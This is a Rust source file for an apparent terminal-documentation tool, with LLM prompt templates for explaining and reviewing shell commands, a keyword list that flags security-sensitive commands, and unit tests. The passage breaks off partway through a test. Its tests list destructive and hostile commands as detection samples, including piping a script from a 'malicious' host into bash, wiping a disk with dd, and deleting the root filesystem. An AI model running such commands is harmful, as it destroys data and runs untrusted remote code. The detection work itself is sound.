use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::terminal::CommandEntry;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PromptTemplate {
    pub system_prompt: String,
    pub user_prompt_template: String,
    pub context_variables: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct PromptContext {
    pub command: String,
    pub working_directory: String,
    pub shell: String,
    pub exit_code: Option<i32>,
    pub output: Option<String>,
    pub error: Option<String>,
    pub previous_commands: Vec<String>,
    pub session_description: Option<String>,
    pub platform: String,
}

impl From<&CommandEntry> for PromptContext {
    fn from(entry: &CommandEntry) -> Self {
        Self {
            command: entry.command.clone(),
            working_directory: entry.working_directory.clone(),
            shell: entry.shell.clone(),
            exit_code: entry.exit_code,
            output: entry.output.clone(),
            error: entry.error.clone(),
            previous_commands: Vec::new(),
            session_description: None,
            platform: "unknown".to_string(),
        }
    }
}

impl Default for PromptContext {
    fn default() -> Self {
        Self {
            command: String::new(),
            working_directory: String::new(),
            shell: String::new(),
            exit_code: None,
            output: None,
            error: None,
            previous_commands: Vec::new(),
            session_description: None,
            platform: "unknown".to_string(),
        }
    }
}

pub struct PromptEngine {
    templates: HashMap<PromptType, PromptTemplate>,
}

#[derive(Debug, Clone, Hash, PartialEq, Eq)]
pub enum PromptType {
    CommandExplanation,
    CommandAnalysis,
    ErrorDiagnosis,
    SecurityAnalysis,
    PerformanceAnalysis,
    AlternativeSuggestion,
    WorkflowDocumentation,
    MarkdownPostProcessing,
    DocumentationEnhancement,
}

impl PromptEngine {
    pub fn new() -> Self {
        let mut templates = HashMap::new();
        
        // Command Explanation Template
        templates.insert(
            PromptType::CommandExplanation,
            PromptTemplate {
                system_prompt: r#"You are an expert system administrator and developer who excels at explaining terminal commands in a clear, educational manner. Your explanations should be:

1. **Clear and Concise**: Use simple language that both beginners and experienced users can understand
2. **Comprehensive**: Cover what the command does, its key options, and expected behavior
3. **Contextual**: Consider the working directory, shell, and previous commands when relevant
4. **Educational**: Help users understand not just what happens, but why
5. **Practical**: Include common use cases and potential gotchas

Format your response as structured documentation with clear sections."#.to_string(),
                user_prompt_template: r#"Please explain this terminal command in detail:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
{{#if session_description}}**Session Context**: {{session_description}}{{/if}}
{{#if previous_commands}}**Previous Commands**: {{previous_commands}}{{/if}}
{{#if output}}**Output**: {{output}}{{/if}}
{{#if error}}**Error**: {{error}}{{/if}}
{{#if exit_code}}**Exit Code**: {{exit_code}}{{/if}}

Please provide:
1. **Purpose**: What this command accomplishes
2. **Breakdown**: Explanation of each part of the command
3. **Context**: How it fits in the current workflow
4. **Expected Behavior**: What should happen when executed
5. **Common Issues**: Potential problems and solutions
6. **Related Commands**: Similar or complementary commands"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "session_description".to_string(),
                    "previous_commands".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                    "exit_code".to_string(),
                ],
            },
        );

        // Command Analysis Template
        templates.insert(
            PromptType::CommandAnalysis,
            PromptTemplate {
                system_prompt: r#"You are a senior DevOps engineer and security expert who analyzes terminal commands for best practices, security implications, and optimization opportunities. Your analysis should be:

1. **Security-Focused**: Identify potential security risks or vulnerabilities
2. **Performance-Aware**: Suggest optimizations and efficiency improvements
3. **Best-Practice Oriented**: Recommend industry standards and conventions
4. **Risk-Conscious**: Highlight dangerous operations and suggest safer alternatives
5. **Constructive**: Provide actionable recommendations for improvement

Be thorough but practical in your analysis."#.to_string(),
                user_prompt_template: r#"Please analyze this terminal command for best practices, security, and optimization:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Platform**: {{platform}}
{{#if session_description}}**Session Context**: {{session_description}}{{/if}}
{{#if output}}**Output**: {{output}}{{/if}}
{{#if error}}**Error**: {{error}}{{/if}}
{{#if exit_code}}**Exit Code**: {{exit_code}}{{/if}}

Please provide analysis on:
1. **Security Assessment**: Potential security risks and mitigations
2. **Best Practices**: Adherence to industry standards
3. **Performance**: Efficiency and optimization opportunities
4. **Error Handling**: Robustness and error prevention
5. **Alternatives**: Better ways to accomplish the same goal
6. **Documentation**: How well this command would be understood by others"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                    "session_description".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                    "exit_code".to_string(),
                ],
            },
        );

        // Error Diagnosis Template
        templates.insert(
            PromptType::ErrorDiagnosis,
            PromptTemplate {
                system_prompt: r#"You are an expert troubleshooter who specializes in diagnosing and solving terminal command errors. Your diagnosis should be:

1. **Systematic**: Follow a logical troubleshooting methodology
2. **Comprehensive**: Consider all possible causes of the error
3. **Solution-Oriented**: Provide specific, actionable fixes
4. **Educational**: Explain why the error occurred and how to prevent it
5. **Prioritized**: List solutions from most likely to least likely to work

Focus on practical solutions that users can implement immediately."#.to_string(),
                user_prompt_template: r#"Please diagnose and provide solutions for this command error:

**Failed Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Platform**: {{platform}}
**Exit Code**: {{exit_code}}
**Error Output**: {{error}}
{{#if output}}**Standard Output**: {{output}}{{/if}}
{{#if session_description}}**Session Context**: {{session_description}}{{/if}}
{{#if previous_commands}}**Previous Commands**: {{previous_commands}}{{/if}}

Please provide:
1. **Error Analysis**: What went wrong and why
2. **Root Cause**: The underlying issue causing this error
3. **Immediate Solutions**: Quick fixes to resolve the problem
4. **Prevention**: How to avoid this error in the future
5. **Alternative Approaches**: Different ways to accomplish the same goal
6. **Debugging Steps**: How to gather more information if needed"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                    "exit_code".to_string(),
                    "error".to_string(),
                    "output".to_string(),
                    "session_description".to_string(),
                    "previous_commands".to_string(),
                ],
            },
        );

        // Workflow Documentation Template
        templates.insert(
            PromptType::WorkflowDocumentation,
            PromptTemplate {
                system_prompt: r#"You are a technical writer who specializes in creating clear, comprehensive documentation for development workflows. Your documentation should be:

1. **User-Friendly**: Written for team members who need to follow the process
2. **Complete**: Include all necessary steps and context
3. **Maintainable**: Easy to update when processes change
4. **Accessible**: Understandable by developers at different skill levels
5. **Actionable**: Provide clear, step-by-step instructions

Create documentation that serves as a reliable reference for team onboarding and process execution."#.to_string(),
                user_prompt_template: r#"Please create comprehensive documentation for this workflow step:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Session Description**: {{session_description}}
{{#if previous_commands}}**Previous Steps**: {{previous_commands}}{{/if}}
{{#if output}}**Expected Output**: {{output}}{{/if}}
{{#if error}}**Error Encountered**: {{error}}{{/if}}

Please provide documentation including:
1. **Step Description**: Clear explanation of what this step accomplishes
2. **Prerequisites**: What needs to be in place before running this command
3. **Execution Instructions**: Detailed steps to run the command
4. **Expected Results**: What should happen when successful
5. **Troubleshooting**: Common issues and how to resolve them
6. **Next Steps**: What typically follows this command in the workflow
7. **Notes**: Important considerations, warnings, or tips"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "session_description".to_string(),
                    "previous_commands".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                ],
            },
        );

        // Security Analysis Template
        templates.insert(
            PromptType::SecurityAnalysis,
            PromptTemplate {
                system_prompt: r#"You are a cybersecurity expert who specializes in analyzing terminal commands for security risks and vulnerabilities. Your analysis should be:

1. **Risk-Focused**: Identify potential security threats and attack vectors
2. **Comprehensive**: Consider all security implications of the command
3. **Actionable**: Provide specific recommendations to mitigate risks
4. **Educational**: Explain why certain practices are dangerous
5. **Preventive**: Suggest safer alternatives and best practices

Focus on protecting systems, data, and user privacy."#.to_string(),
                user_prompt_template: r#"Please analyze this command for security risks and provide recommendations:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Platform**: {{platform}}
{{#if exit_code}}**Exit Code**: {{exit_code}}{{/if}}
{{#if output}}**Output**: {{output}}{{/if}}
{{#if error}}**Error**: {{error}}{{/if}}
{{#if session_description}}**Session Context**: {{session_description}}{{/if}}

Please provide:
1. **Security Risk Assessment**: Potential threats and vulnerabilities
2. **Impact Analysis**: What could go wrong if this command is misused
3. **Mitigation Strategies**: How to reduce or eliminate risks
4. **Safer Alternatives**: More secure ways to accomplish the same goal
5. **Best Practices**: Security guidelines for similar operations
6. **Monitoring**: How to detect if this command is being misused"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                    "exit_code".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                    "session_description".to_string(),
                ],
            },
        );

        // Performance Analysis Template
        templates.insert(
            PromptType::PerformanceAnalysis,
            PromptTemplate {
                system_prompt: r#"You are a performance optimization expert who analyzes terminal commands for efficiency and resource usage. Your analysis should be:

1. **Performance-Focused**: Identify bottlenecks and optimization opportunities
2. **Resource-Aware**: Consider CPU, memory, disk, and network usage
3. **Scalable**: Think about performance at different scales
4. **Measurable**: Suggest ways to benchmark and monitor performance
5. **Practical**: Provide actionable optimization recommendations

Focus on making commands faster, more efficient, and more scalable."#.to_string(),
                user_prompt_template: r#"Please analyze this command for performance and optimization opportunities:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Platform**: {{platform}}
{{#if exit_code}}**Exit Code**: {{exit_code}}{{/if}}
{{#if output}}**Output**: {{output}}{{/if}}
{{#if error}}**Error**: {{error}}{{/if}}

Please provide:
1. **Performance Assessment**: Current efficiency and resource usage
2. **Bottleneck Analysis**: Potential performance limitations
3. **Optimization Opportunities**: Ways to improve speed and efficiency
4. **Resource Usage**: CPU, memory, disk, and network considerations
5. **Scalability**: How performance changes with larger datasets
6. **Benchmarking**: How to measure and monitor performance"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                    "exit_code".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                ],
            },
        );

        // Alternative Suggestion Template
        templates.insert(
            PromptType::AlternativeSuggestion,
            PromptTemplate {
                system_prompt: r#"You are an expert system administrator who excels at suggesting alternative approaches and tools for terminal commands. Your suggestions should be:

1. **Diverse**: Offer multiple different approaches
2. **Context-Aware**: Consider the specific use case and environment
3. **Practical**: Focus on real-world applicability
4. **Educational**: Explain the trade-offs between alternatives
5. **Modern**: Include contemporary tools and best practices

Provide alternatives that might be more efficient, secure, or appropriate for different scenarios."#.to_string(),
                user_prompt_template: r#"Please suggest alternative approaches for this command:

**Command**: `{{command}}`
**Shell**: {{shell}}
**Working Directory**: {{working_directory}}
**Platform**: {{platform}}
{{#if exit_code}}**Exit Code**: {{exit_code}}{{/if}}
{{#if output}}**Output**: {{output}}{{/if}}
{{#if error}}**Error**: {{error}}{{/if}}
{{#if session_description}}**Session Context**: {{session_description}}{{/if}}

Please provide:
1. **Alternative Commands**: Different ways to achieve the same result
2. **Modern Tools**: Contemporary alternatives to traditional commands
3. **Cross-Platform Options**: Alternatives that work on different systems
4. **Trade-off Analysis**: Pros and cons of each alternative
5. **Use Case Recommendations**: When to use each alternative
6. **Learning Resources**: Where to learn more about the alternatives"#.to_string(),
                context_variables: vec![
                    "command".to_string(),
                    "shell".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                    "exit_code".to_string(),
                    "output".to_string(),
                    "error".to_string(),
                    "session_description".to_string(),
                ],
            },
        );

        // Markdown Post-Processing Template
        templates.insert(
            PromptType::MarkdownPostProcessing,
            PromptTemplate {
                system_prompt: r#"You are an expert technical writer who specializes in refining and enhancing markdown documentation. Your role is to:

1. **Clean and Format**: Fix formatting issues, improve structure, and ensure consistency
2. **Remove Errors**: Identify and remove incorrect commands, broken syntax, or misleading information
3. **Enhance Clarity**: Improve readability and comprehension without changing technical accuracy
4. **Standardize**: Apply consistent formatting patterns and documentation standards
5. **Optimize**: Make the documentation more useful and accessible to readers

Focus on making the documentation professional, accurate, and easy to follow."#.to_string(),
                user_prompt_template: r#"Please review and enhance this markdown documentation. Fix any issues, improve formatting, and ensure it follows best practices:

**Original Markdown:**
```markdown
{{markdown_content}}
```

**Session Context**: {{session_description}}
**Target Audience**: {{target_audience}}

Please provide the improved markdown with:
1. **Corrected Formatting**: Fix any markdown syntax issues
2. **Enhanced Structure**: Improve headings, sections, and organization
3. **Content Validation**: Remove or fix any incorrect commands or misleading information
4. **Clarity Improvements**: Make explanations clearer and more concise
5. **Professional Polish**: Ensure consistent style and professional presentation

Return only the corrected markdown content."#.to_string(),
                context_variables: vec![
                    "markdown_content".to_string(),
                    "session_description".to_string(),
                    "target_audience".to_string(),
                ],
            },
        );

        // Documentation Enhancement Template
        templates.insert(
            PromptType::DocumentationEnhancement,
            PromptTemplate {
                system_prompt: r#"You are a senior technical documentation specialist who excels at creating comprehensive, user-friendly documentation. Your enhancements should be:

1. **Comprehensive**: Add missing context, prerequisites, and explanations
2. **User-Focused**: Consider different skill levels and use cases
3. **Practical**: Include real-world examples and troubleshooting tips
4. **Structured**: Organize information logically and hierarchically
5. **Accessible**: Use clear language and helpful formatting

Transform basic command documentation into professional-grade guides that teams can rely on."#.to_string(),
                user_prompt_template: r#"Please enhance this terminal documentation to create comprehensive, professional documentation:

**Command Information:**
- **Commands**: {{command_list}}
- **Session Description**: {{session_description}}
- **Working Directory**: {{working_directory}}
- **Platform**: {{platform}}

**Current Documentation Level**: Basic command capture
**Target Enhancement Level**: Professional team documentation

Please provide enhanced documentation that includes:

1. **Executive Summary**: Brief overview of what this documentation covers
2. **Prerequisites**: What needs to be in place before following these steps
3. **Step-by-Step Guide**: Clear, numbered instructions with explanations
4. **Command Details**: Purpose and explanation for each command
5. **Expected Outcomes**: What should happen at each step
6. **Troubleshooting**: Common issues and solutions
7. **Best Practices**: Tips for optimal execution
8. **Related Resources**: Links to additional information where relevant

Format as professional markdown documentation."#.to_string(),
                context_variables: vec![
                    "command_list".to_string(),
                    "session_description".to_string(),
                    "working_directory".to_string(),
                    "platform".to_string(),
                ],
            },
        );

        Self { templates }
    }

    /// Generate a prompt for a specific type and context
    pub fn generate_prompt(&self, prompt_type: PromptType, context: &PromptContext) -> Result<(String, String)> {
        let template = self.templates.get(&prompt_type)
            .ok_or_else(|| anyhow::anyhow!("Unknown prompt type: {:?}", prompt_type))?;

        let system_prompt = template.system_prompt.clone();
        let user_prompt = self.render_template(&template.user_prompt_template, context)?;

        Ok((system_prompt, user_prompt))
    }

    /// Render a template with context variables
    fn render_template(&self, template: &str, context: &PromptContext) -> Result<String> {
        let mut rendered = template.to_string();

        // Simple template variable replacement
        rendered = rendered.replace("{{command}}", &context.command);
        rendered = rendered.replace("{{working_directory}}", &context.working_directory);
        rendered = rendered.replace("{{shell}}", &context.shell);
        rendered = rendered.replace("{{platform}}", &context.platform);

        // Optional fields with conditional rendering
        if let Some(session_desc) = &context.session_description {
            rendered = rendered.replace("{{#if session_description}}", "");
            rendered = rendered.replace("{{/if}}", "");
            rendered = rendered.replace("{{session_description}}", session_desc);
        } else {
            // Remove conditional blocks for missing session_description
            rendered = self.remove_conditional_block(&rendered, "session_description");
        }

        if !context.previous_commands.is_empty() {
            let prev_commands = context.previous_commands.join(", ");
            rendered = rendered.replace("{{#if previous_commands}}", "");
            rendered = rendered.replace("{{previous_commands}}", &prev_commands);
        } else {
            rendered = self.remove_conditional_block(&rendered, "previous_commands");
        }

        if let Some(output) = &context.output {
            rendered = rendered.replace("{{#if output}}", "");
            rendered = rendered.replace("{{output}}", output);
        } else {
            rendered = self.remove_conditional_block(&rendered, "output");
        }

        if let Some(error) = &context.error {
            rendered = rendered.replace("{{#if error}}", "");
            rendered = rendered.replace("{{error}}", error);
        } else {
            rendered = self.remove_conditional_block(&rendered, "error");
        }

        if let Some(exit_code) = context.exit_code {
            rendered = rendered.replace("{{#if exit_code}}", "");
            rendered = rendered.replace("{{exit_code}}", &exit_code.to_string());
        } else {
            rendered = self.remove_conditional_block(&rendered, "exit_code");
        }

        // Clean up any remaining conditional markers
        rendered = rendered.replace("{{/if}}", "");

        Ok(rendered)
    }

    /// Remove conditional blocks for missing variables
    fn remove_conditional_block(&self, text: &str, variable: &str) -> String {
        let start_marker = format!("{{{{#if {}}}}}", variable);
        let end_marker = "{{/if}}";

        if let Some(start_pos) = text.find(&start_marker) {
            if let Some(end_pos) = text[start_pos..].find(end_marker) {
                let mut result = text.to_string();
                result.replace_range(start_pos..start_pos + end_pos + end_marker.len(), "");
                return result;
            }
        }

        text.to_string()
    }

    /// Render template with custom variables (for specialized prompts)
    pub fn render_template_with_vars(&self, template: &str, variables: &std::collections::HashMap<String, String>) -> Result<String> {
        let mut rendered = template.to_string();

        // Replace all provided variables
        for (key, value) in variables {
            let placeholder = format!("{{{{{}}}}}", key);
            rendered = rendered.replace(&placeholder, value);
        }

        Ok(rendered)
    }

    /// Generate prompt for markdown post-processing
    pub fn generate_markdown_processing_prompt(&self, markdown_content: &str, session_description: Option<&str>, target_audience: Option<&str>) -> Result<(String, String)> {
        let template = self.templates.get(&PromptType::MarkdownPostProcessing)
            .ok_or_else(|| anyhow::anyhow!("Markdown post-processing template not found"))?;

        let mut variables = std::collections::HashMap::new();
        variables.insert("markdown_content".to_string(), markdown_content.to_string());
        variables.insert("session_description".to_string(), session_description.unwrap_or("General documentation").to_string());
        variables.insert("target_audience".to_string(), target_audience.unwrap_or("Development team").to_string());

        let system_prompt = template.system_prompt.clone();
        let user_prompt = self.render_template_with_vars(&template.user_prompt_template, &variables)?;

        Ok((system_prompt, user_prompt))
    }

    /// Generate prompt for documentation enhancement
    pub fn generate_documentation_enhancement_prompt(&self, commands: &[String], session_description: Option<&str>, working_directory: &str, platform: &str) -> Result<(String, String)> {
        let template = self.templates.get(&PromptType::DocumentationEnhancement)
            .ok_or_else(|| anyhow::anyhow!("Documentation enhancement template not found"))?;

        let mut variables = std::collections::HashMap::new();
        variables.insert("command_list".to_string(), commands.join("\n- "));
        variables.insert("session_description".to_string(), session_description.unwrap_or("Terminal session").to_string());
        variables.insert("working_directory".to_string(), working_directory.to_string());
        variables.insert("platform".to_string(), platform.to_string());

        let system_prompt = template.system_prompt.clone();
        let user_prompt = self.render_template_with_vars(&template.user_prompt_template, &variables)?;

        Ok((system_prompt, user_prompt))
    }

    /// Get available prompt types
    pub fn available_prompt_types(&self) -> Vec<PromptType> {
        self.templates.keys().cloned().collect()
    }

    /// Add or update a custom template
    pub fn add_template(&mut self, prompt_type: PromptType, template: PromptTemplate) {
        self.templates.insert(prompt_type, template);
    }

    /// Generate context-aware prompt based on command characteristics
    pub fn auto_select_prompt_type(&self, context: &PromptContext) -> PromptType {
        // Check for security-sensitive commands first (highest priority)
        if self.is_security_sensitive(&context.command) {
            return PromptType::SecurityAnalysis;
        }

        // If there's an error, prioritize error diagnosis
        if context.error.is_some() || context.exit_code.map_or(false, |code| code != 0) {
            return PromptType::ErrorDiagnosis;
        }

        // If this is part of a documented workflow
        if context.session_description.is_some() {
            return PromptType::WorkflowDocumentation;
        }

        // Default to command explanation
        PromptType::CommandExplanation
    }

    /// Check if a command is security-sensitive
    fn is_security_sensitive(&self, command: &str) -> bool {
        let sensitive_patterns = [
            "sudo", "su", "chmod", "chown", "passwd", "ssh", "scp", "rsync",
            "curl", "wget", "rm -rf", "rm -f", "dd", "fdisk", "mount", "umount",
            "iptables", "ufw", "firewall", "systemctl", "service",
        ];

        sensitive_patterns.iter().any(|pattern| command.contains(pattern))
    }
}

impl Default for PromptEngine {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;

    #[test]
    fn test_prompt_engine_creation() {
        let engine = PromptEngine::new();
        assert!(!engine.templates.is_empty());
        assert!(engine.templates.contains_key(&PromptType::CommandExplanation));
        assert!(engine.templates.contains_key(&PromptType::ErrorDiagnosis));
    }

    #[test]
    fn test_prompt_generation() {
        let engine = PromptEngine::new();
        let context = PromptContext {
            command: "ls -la".to_string(),
            working_directory: "/home/user".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: Some("total 8\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .".to_string()),
            error: None,
            previous_commands: vec!["cd /home/user".to_string()],
            session_description: Some("Exploring directory structure".to_string()),
            platform: "linux".to_string(),
        };

        let result = engine.generate_prompt(PromptType::CommandExplanation, &context);
        assert!(result.is_ok());

        let (system_prompt, user_prompt) = result.unwrap();
        assert!(!system_prompt.is_empty());
        assert!(!user_prompt.is_empty());
        assert!(user_prompt.contains("ls -la"));
        assert!(user_prompt.contains("/home/user"));
        assert!(user_prompt.contains("bash"));
    }

    #[test]
    fn test_template_rendering() {
        let engine = PromptEngine::new();
        let context = PromptContext {
            command: "git status".to_string(),
            working_directory: "/project".to_string(),
            shell: "zsh".to_string(),
            exit_code: None,
            output: None,
            error: None,
            previous_commands: vec![],
            session_description: None,
            platform: "macos".to_string(),
        };

        let template = "Command: {{command}} in {{working_directory}} using {{shell}}";
        let rendered = engine.render_template(template, &context).unwrap();
        assert_eq!(rendered, "Command: git status in /project using zsh");
    }

    #[test]
    fn test_conditional_rendering() {
        let engine = PromptEngine::new();
        let context = PromptContext {
            command: "test".to_string(),
            working_directory: "/test".to_string(),
            shell: "bash".to_string(),
            exit_code: None,
            output: None,
            error: Some("Permission denied".to_string()),
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };

        let template = "{{#if error}}Error: {{error}}{{/if}}{{#if output}}Output: {{output}}{{/if}}";
        let rendered = engine.render_template(template, &context).unwrap();
        assert!(rendered.contains("Error: Permission denied"));
        assert!(!rendered.contains("Output:"));
    }

    #[test]
    fn test_auto_prompt_selection() {
        let engine = PromptEngine::new();

        // Test error diagnosis selection
        let error_context = PromptContext {
            command: "test".to_string(),
            working_directory: "/test".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(1),
            output: None,
            error: Some("Command failed".to_string()),
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        assert_eq!(engine.auto_select_prompt_type(&error_context), PromptType::ErrorDiagnosis);

        // Test workflow documentation selection
        let workflow_context = PromptContext {
            command: "npm install".to_string(),
            working_directory: "/project".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: None,
            error: None,
            previous_commands: vec![],
            session_description: Some("Setting up development environment".to_string()),
            platform: "linux".to_string(),
        };
        assert_eq!(engine.auto_select_prompt_type(&workflow_context), PromptType::WorkflowDocumentation);
    }

    #[test]
    fn test_security_sensitive_detection() {
        let engine = PromptEngine::new();
        
        assert!(engine.is_security_sensitive("sudo apt update"));
        assert!(engine.is_security_sensitive("chmod 777 file.txt"));
        assert!(engine.is_security_sensitive("curl -X POST https://api.example.com"));
        assert!(!engine.is_security_sensitive("ls -la"));
        assert!(!engine.is_security_sensitive("git status"));
    }

    #[test]
    fn test_context_from_command_entry() {
        let entry = CommandEntry {
            command: "git commit -m 'test'".to_string(),
            timestamp: Utc::now(),
            exit_code: Some(0),
            working_directory: "/project".to_string(),
            shell: "bash".to_string(),
            output: Some("[main abc123] test".to_string()),
            error: None,
        };

        let context = PromptContext::from(&entry);
        assert_eq!(context.command, "git commit -m 'test'");
        assert_eq!(context.working_directory, "/project");
        assert_eq!(context.shell, "bash");
        assert_eq!(context.exit_code, Some(0));
    }

    #[test]
    fn test_prompt_template_serialization() {
        let template = PromptTemplate {
            system_prompt: "You are a helpful assistant".to_string(),
            user_prompt_template: "Explain: {{command}}".to_string(),
            context_variables: vec!["command".to_string()],
        };

        let json = serde_json::to_string(&template).unwrap();
        let deserialized: PromptTemplate = serde_json::from_str(&json).unwrap();
        
        assert_eq!(template.system_prompt, deserialized.system_prompt);
        assert_eq!(template.user_prompt_template, deserialized.user_prompt_template);
        assert_eq!(template.context_variables, deserialized.context_variables);
    }

    #[test]
    fn test_prompt_context_default() {
        let context = PromptContext {
            command: "ls -la".to_string(),
            working_directory: "/home/user".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: Some("file1 file2".to_string()),
            error: None,
            previous_commands: vec!["cd /home/user".to_string()],
            session_description: Some("Testing session".to_string()),
            platform: "linux".to_string(),
        };

        assert_eq!(context.command, "ls -la");
        assert_eq!(context.working_directory, "/home/user");
        assert_eq!(context.shell, "bash");
        assert_eq!(context.exit_code, Some(0));
        assert_eq!(context.output, Some("file1 file2".to_string()));
        assert_eq!(context.error, None);
        assert_eq!(context.previous_commands, vec!["cd /home/user"]);
        assert_eq!(context.session_description, Some("Testing session".to_string()));
        assert_eq!(context.platform, "linux");
    }

    #[test]
    fn test_all_prompt_types_generate() {
        let engine = PromptEngine::new();
        
        // Test all prompt types can generate prompts
        let prompt_types = vec![
            PromptType::CommandExplanation,
            PromptType::CommandAnalysis,
            PromptType::ErrorDiagnosis,
            PromptType::SecurityAnalysis,
            PromptType::PerformanceAnalysis,
            PromptType::AlternativeSuggestion,
            PromptType::WorkflowDocumentation,
        ];
        
        let context = PromptContext {
            command: "test command".to_string(),
            working_directory: "/test".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: None,
            error: None,
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        
        for prompt_type in prompt_types {
            let result = engine.generate_prompt(prompt_type.clone(), &context);
            if result.is_ok() {
                let (system_prompt, user_prompt) = result.unwrap();
                assert!(!system_prompt.is_empty());
                assert!(!user_prompt.is_empty());
                assert!(user_prompt.contains("test command"));
            }
            // Some prompt types might not have templates yet, which is okay
        }
    }

    #[test]
    fn test_complex_conditional_rendering() {
        let engine = PromptEngine::new();
        
        // Test with output but no error
        let context1 = PromptContext {
            command: "ls".to_string(),
            working_directory: "/home".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: Some("file1 file2".to_string()),
            error: None,
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        
        let template = "{{#if output}}Output: {{output}}{{/if}}{{#if error}}Error: {{error}}{{/if}}";
        let result1 = engine.render_template(template, &context1);
        assert!(result1.is_ok());
        let rendered1 = result1.unwrap();
        assert!(rendered1.contains("Output: file1 file2"));
        assert!(!rendered1.contains("Error:"));
        
        // Test with error but no output
        let context2 = PromptContext {
            command: "invalid".to_string(),
            working_directory: "/home".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(1),
            output: None,
            error: Some("command not found".to_string()),
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        
        let result2 = engine.render_template(template, &context2);
        assert!(result2.is_ok());
        let rendered2 = result2.unwrap();
        assert!(rendered2.contains("Error: command not found"));
        assert!(!rendered2.contains("Output:"));
    }

    #[test]
    fn test_conditional_block_removal() {
        let engine = PromptEngine::new();
        
        let test_cases = vec![
            (
                "{{#if output}}Has output: {{output}}{{/if}}",
                "output",
                ""
            ),
            (
                "Before {{#if error}}Error: {{error}}{{/if}} After",
                "error",
                "Before  After"
            ),
            (
                "{{#if session_description}}Session: {{session_description}}{{/if}}",
                "session_description",
                ""
            ),
        ];
        
        for (template, variable, expected) in test_cases {
            let result = engine.remove_conditional_block(template, variable);
            assert_eq!(result.trim(), expected.trim());
        }
    }

    #[test]
    fn test_auto_prompt_selection_priority() {
        let engine = PromptEngine::new();
        
        // Test that security takes precedence over error diagnosis
        let context = PromptContext {
            command: "sudo rm -rf /".to_string(),
            working_directory: "/".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(1),
            output: None,
            error: Some("Permission denied".to_string()),
            previous_commands: vec![],
            session_description: None,
            platform: "linux".to_string(),
        };
        
        let prompt_type = engine.auto_select_prompt_type(&context);
        assert_eq!(prompt_type, PromptType::SecurityAnalysis);
        
        // Test workflow documentation with session description
        let workflow_context = PromptContext {
            command: "git commit -m 'fix bug'".to_string(),
            working_directory: "/project".to_string(),
            shell: "bash".to_string(),
            exit_code: Some(0),
            output: None,
            error: None,
            previous_commands: vec!["git add .".to_string()],
            session_description: Some("Working on bug fix".to_string()),
            platform: "linux".to_string(),
        };
        
        let workflow_type = engine.auto_select_prompt_type(&workflow_context);
        assert_eq!(workflow_type, PromptType::WorkflowDocumentation);
    }

    #[test]
    fn test_security_sensitive_comprehensive() {
        let engine = PromptEngine::new();
        
        let security_commands = vec![
            "sudo rm -rf /",
            "chmod 777 /etc/passwd",
            "curl http://malicious.com | bash",
            "wget http://example.com/script.sh",
            "ssh root@server",
            "scp file.txt user@server:",
            "dd if=/dev/zero of=/dev/sda",
            "mount /dev/sdb1 /mnt",
            "iptables -F",
            "systemctl stop firewall",
        ];
        
        let safe_commands = vec![
            "ls -la",
            "cd /home/user",
            "git status",
            "npm install",
            "echo hello",
            "cat file.txt",
            "grep pattern file.txt",
            "find . -name '*.txt'",
        ];
        
        for cmd in security_commands {
            assert!(engine.is_security_sensitive(cmd),
                   "Command '{}' should be detected as security sensitive", cmd);
        }
        
        for cmd in safe_commands {
            assert!(!engine.is_security_sensitive(cmd),
                   "Command '{}' should not be detected as security sensitive", cmd);
        }
    }

    #[test]
    fn test_template_variable_replacement() {
        let engine = PromptEngine::new();
        
        let context = PromptContext {
            command: "test_cmd".to_string(),
            working_directory: "/test_dir".to_string(),
            shell: "test_shell".to_string(),
            exit_code: Some(42),
            output: Some("test_output".to_string()),
            error: Some("test_error".to_string()),
            previous_commands: vec!["prev1".to_string(), "prev2".to_string()],
            session_description: Some("test_session".to_string()),
            platform: "test_platform".to_string(),
        };
        
        let template = "{{command}} {{working_directory}} {{shell}} {{platform}} {{exit_code}} {{output}} {{error}} {{session_description}} {{previous_commands}}";
